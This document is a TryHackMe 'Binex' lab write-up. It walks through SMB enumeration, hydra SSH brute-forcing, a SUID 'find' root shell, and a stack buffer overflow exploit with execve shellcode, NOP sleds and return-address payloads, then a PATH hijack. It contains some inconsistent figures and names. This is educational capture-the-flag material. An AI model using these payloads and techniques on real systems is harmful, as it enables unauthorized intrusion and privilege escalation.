# Binex

## Scanning and Enumeration

```bash
nmap -p- -T4 10.10.139.81
```

Output:

```bash
# Nmap 7.91 scan initiated Sun Nov 22 22:20:44 2020 as: nmap -p139,445,22 -T4 -A -oN nmap.txt 10.10.139.81
Nmap scan report for 10.10.139.81
Host is up (0.10s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 3f:36:de:da:2f:c3:b7:78:6f:a9:25:d6:41:dd:54:69 (RSA)
|   256 d0:78:23:ee:f3:71:58:ae:e9:57:14:17:bb:e3:6a:ae (ECDSA)
|_  256 4c:de:f1:49:df:21:4f:32:ca:e6:8e:bc:6a:96:53:e5 (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)

Aggressive OS guesses: Linux 3.1 (95%)
```

#### Port 139/445

Let's try enumerating SMB

Listing the dirs from the share we have a THM_EXPLOIT workgroup

```bash
smbclient -L \\\\binex\\ --workgroup=THM_EXPLOIT
```

Trying smbmap with no user doesn't give as anything

```bash
smbmap -u '' -d THM_EXPLOIT -H binex
```

Trying **enum4linux** fails even I used the hint

```bash
enum4linux -U binex
enum4linux -U binex -R 1000-1003 //specify range of rid with hint
```

My last resource was metasploit where I used:

```bash
use auxiliary/scanner/smb/smb_version
```

Output:

Detected (versions:1, 2, 3) (preferred dialect:SMB 3.1.1) (compression capabilities:LZNT1)
(encryption capabilities:AES-128-CCM) (signatures:optional)
(guid:{5f6d6874-7865-6c70-6f69-740000000000}) (authentication domain:THM_EXPLOIT)

A nice article:
[nullbyte](https://null-byte.wonderhowto.com/how-to/enumerate-smb-with-enum4linux-smbclient-0198049/)

#### Port 22

After failing at enumerating SMB I checked if the ssh version was vulnerable

7.6p1 is vulnerable to user enumeration

```bash
use auxiliary/scanner/ssh/ssh_enumusers
```

But it din't work.

After trying everything I could. I read the write-up for the foothold.
Apparently **enum4linux** should have returned valid users but it's broken
My gosh.

The supposing results where:

```bash
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-2007993849-1719925537-2372789573
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\kel (Local User)
S-1-22-1-1001 Unix User\des (Local User)
S-1-22-1-1002 Unix User\tryhackme (Local User)
S-1-22-1-1003 Unix User\noentry (Local User)
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-1000 *unknown*\*unknown* (8)
S-1-5-32-1001 *unknown*\*unknown* (8)
S-1-5-32-1002 *unknown*\*unknown* (8)
S-1-5-32-1003 *unknown*\*unknown* (8)
```

## Exploitation

Using **hydra** I brute forced the password in a few minutes

```bash
hydra -l tryhackme -P /usr/share/wordlists/rockyou.txt -t 4 binex ssh
```

The password is: `thebest`

## Post Exploitation

Let's now find the SUID bit set binaries:

```bash
find / -u=s  2>/dev/null
find / -perm /4000 2>/dev/null
```

We see we have **/home/des/bof** we get perm denied  
We also have **/usr/bin/find** that is owned by des

Looking at [GTFObin](https://gtfobins.github.io/gtfobins/find/#suid)
We can elevate our privileges with **find**

```bash
./find . -exec /bin/sh -p \; -quit
```

And we get some credentials

```text
username: des
password: destructive_72656275696c64
```

The **bof** executable is owned by **tes**
So if we find a way to get a shell from executable we will be able to elevate
our privileges to **tes**

Let's exploit the BOF

1. Finding the offset

We set the assembly language to intel (it is easier to read)

```bash
(gdb) set disassembly-flavor intel
```

We first need to succesfully overwrite the rbp register

```bash
(gdb)run < <((python -c "print('A'*630)"))
```

We get a segmentation fault
A segmentation fault means the program tried to access or write to a an invalid
memory address.
In this case, it is probably because we set the return address of one of the
functions on the stack to an invalid one.

Using the `info registers` command we can see 0x414141.. in the rbp register
This means that we succeded

To find the offset we use metasploit

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 650
```

Now we see the value of the **rsp** register

```bash
x/xg $rsp
```

And we find the offset by using metasploit again

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x3775413675413575
```

Output:

```text
[*] Exact match at offset 616
```

It's a good practice to confirm if the offset is correct by checking cause
in some cases some other variables are closer to the return address or other
protections are involved which would make the offset different.

We can do that by running the following command in **gdb**

```bash
(gdb) r < <(python -c 'print("\x90"*616 + "BBBBBCCC")')
```

In our case it's correct

And checking the value of the **rsp** register

We also check if our NOPs are on the stack

```bash
(gdb) x/xg $rsp
```

In general the payload we need to run is:

```bash
python -c “print (NOP*no_of_nops + shellcode + random_data*no_of_random_data + memory address)”
```

Let's find our shellcode

2. Finding a shellcode

We need a shellcode:
`\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05`
`\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05`

We can find more:
[here](http://shell-storm.org/shellcode/)

And the length of the shellcode: len(shellcode) = 24

Let's insert our shellcode after our NOPs and then subtract the number of bytes
of shellcode we have from our NOPs so that we can still overwrite our return address.
In this case I have 27 bytes of shellcode

At this point, we need to know the size of our payload
and find the return address of the shellcode.

Payload(624 bytes) = NOP*(616 - 24) + 24(shellcode) + 8(return address)

```bash
run < <((python -c "print('\x90'*(616 - 24) + '\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05' + 'B'*8)"))
```

Now we can point our return address into the middle of our NOP sled.
The instruction pointer will slide down our NOP sled and then hit our shellcode.

```bash
(gdb) x/616xb $rsp - 620
```

We can choose a random address that is above our shellcode

```bash
0x7fffffffe33c
```

Before putting this memory address into our exploit,
we need to remember that on Intel and Amd 64-bit architectures use little-endian
format.
This means that the lower-value byte is stored first.
You can see what architecture they use by:

```bash
show endian
```

On a big-endian system bytes would be, intuitively, stored this way:

```bash
\x00\x00\x7f\xff\xff\xff\xe3\x3c
```

As opposed to little-endian like this:

```bash
\x3c\xe3\xff\xff\xff\x7f\x00\x00
```

Now that we have the address we can insert it and execute the program

```bash
(gdb) r < <(python -c "print('\x90'*(616 - 24) + '\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05' + '\x3c\xe3\xff\xff\xff\x7f\x00\x00')")
```

We get it gave us not a segmentation fault but an Illegal instruction signal.
This means that we successfully jumped to our shellcode but it could be corrupt.
Let's verify this by replacing the first byte of the shellcode with a **0xcc**.
If the CPU hits the 0xcc instruction it will give a Trace/breakpoint trap signal.

```bash
(gdb) r < <(python -c "print('\x90'*(616 - 24) + '\xcc\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05' + '\x3c\xe3\xff\xff\xff\x7f\x00\x00')")
```

This will give us the end of the NOPs and the start of our shellcode.
If we hit enter a couple of times we will see that there is inconsistency with
what we intended to inject into the program and what is actually on the stack.

Through playing around with the exploit I found that taking away the number of
NOPs before the shellcode and then putting them after the shellcode but before
the return address made it work.

```bash
(gdb) r < <(python -c "print('\x90'*(616 - 24 - 100) + '\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05' + '\x90'*100 + '\x3c\xe3\xff\xff\xff\x7f\x00\x00')")
```

Now we just need to know how to execute this outside of GDB so the binary can
run as kel.
Let's execute the binary outside of GDB just like before.
The only exception to this is we surround with brackets and immediately call
cat so that stdin is not closed when we execute the program.

```bash
(python -c "print('\x90'*(616 - 24 - 100) + '\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05' + '\x90'*100 + '\x3c\xe3\xff\xff\xff\x7f\x00\x00')";cat) | ./bof
(python -c "print('\x90'*(616 - 27 - 100) + '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + '\x90'*100 + '\x3c\xe3\xff\xff\xff\x7f\x00\x00')";cat) | ./bof
```

## Privilege escalation

echo "/bin/bash" > /tmp/ps
chmod +x /tmp/ps
export PATH=/tmp:$PATH

## Other Methods

```python
from struct import pack
#buf = "\xcc"*8
buf = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
payload = "\x90"*400
payload += buf
payload += "A" * (208 - len(buf))
payload += "B" * 8
payload += pack("<Q", 0x7fffffffe300)

print payload
```

```bash
python exploit.py > text
(cat text;cat) | ./bof
```

```json
```
